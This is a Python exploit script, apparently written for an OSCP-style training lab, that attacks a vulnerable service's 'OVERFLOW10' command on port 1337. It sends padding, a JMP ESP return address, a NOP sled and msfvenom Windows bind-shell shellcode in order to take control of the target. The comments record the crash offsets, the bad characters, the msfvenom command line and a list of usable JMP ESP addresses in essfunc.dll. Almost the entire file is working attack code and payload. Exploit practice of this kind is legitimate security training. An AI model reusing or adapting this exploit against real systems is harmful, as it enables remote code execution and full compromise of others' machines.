import socket
import time


# Fuzzing shows crash at 600 bytes input

host = "10.10.237.37"
port = 1337

offset = 537
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
    b"\x9f\x3f\x28\x27\x83\xee\xfc\xe2\xf4\x63\xd7\xaa\x27\x9f\x3f"
    b"\x48\xae\x7a\x0e\xe8\x43\x14\x6f\x18\xac\xcd\x33\xa3\x75\x8b"
    b"\xb4\x5a\x0f\x90\x88\x62\x01\xae\xc0\x84\x1b\xfe\x43\x2a\x0b"
    b"\xbf\xfe\xe7\x2a\x9e\xf8\xca\xd5\xcd\x68\xa3\x75\x8f\xb4\x62"
    b"\x1b\x14\x73\x39\x5f\x7c\x77\x29\xf6\xce\xb4\x71\x07\x9e\xec"
    b"\xa3\x6e\x87\xdc\x12\x6e\x14\x0b\xa3\x26\x49\x0e\xd7\x8b\x5e"
    b"\xf0\x25\x26\x58\x07\xc8\x52\x69\x3c\x55\xdf\xa4\x42\x0c\x52"
    b"\x7b\x67\xa3\x7f\xbb\x3e\xfb\x41\x14\x33\x63\xac\xc7\x23\x29"
    b"\xf4\x14\x3b\xa3\x26\x4f\xb6\x6c\x03\xbb\x64\x73\x46\xc6\x65"
    b"\x79\xd8\x7f\x60\x77\x7d\x14\x2d\xc3\xaa\xc2\x57\x1b\x15\x9f"
    b"\x3f\x40\x50\xec\x0d\x77\x73\xf7\x73\x5f\x01\x98\xc0\xfd\x9f"
    b"\x0f\x3e\x28\x27\xb6\xfb\x7c\x77\xf7\x16\xa8\x4c\x9f\xc0\xfd"
    b"\x4d\x97\x66\x78\xc5\x62\x7f\x78\x67\xcf\x57\xc2\x28\x40\xdf"
    b"\xd7\xf2\x08\x57\x2a\x27\x8e\x63\xa1\xc1\xf5\x2f\x7e\x70\xf7"
    b"\xfd\xf3\x10\xf8\xc0\xfd\x70\xf7\x88\xc1\x1f\x60\xc0\xfd\x70"
    b"\xf7\x4b\xc4\x1c\x7e\xc0\xfd\x70\x08\x57\x5d\x49\xd2\x5e\xd7"
    b"\xf2\xf7\x5c\x45\x43\x9f\xb6\xcb\x70\xc8\x68\x19\xd1\xf5\x2d"
    b"\x71\x71\x7d\xc2\x4e\xe0\xdb\x1b\x14\x26\x9e\xb2\x6c\x03\x8f"
    b"\xf9\x28\x63\xcb\x6f\x7e\x71\xc9\x79\x7e\x69\xc9\x69\x7b\x71"
    b"\xf7\x46\xe4\x18\x19\xc0\xfd\xae\x7f\x71\x7e\x61\x60\x0f\x40"
    b"\x2f\x18\x22\x48\xd8\x4a\x84\xd8\x92\x3d\x69\x40\x81\x0a\x82"
    b"\xb5\xd8\x4a\x03\x2e\x5b\x95\xbf\xd3\xc7\xea\x3a\x93\x60\x8c"
    b"\x4d\x47\x4d\x9f\x6c\xd7\xf2"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW10 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 41397241
# ESP at crash: 019CFA30 -> 73413073

# EIP Pattern Offset: 537
# ESP (0x019cfa30) points at offset 541

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0xa0, 0xad, 0xbe, 0xde, 0xef

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\xa0\xad\xbe\xde\xef'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
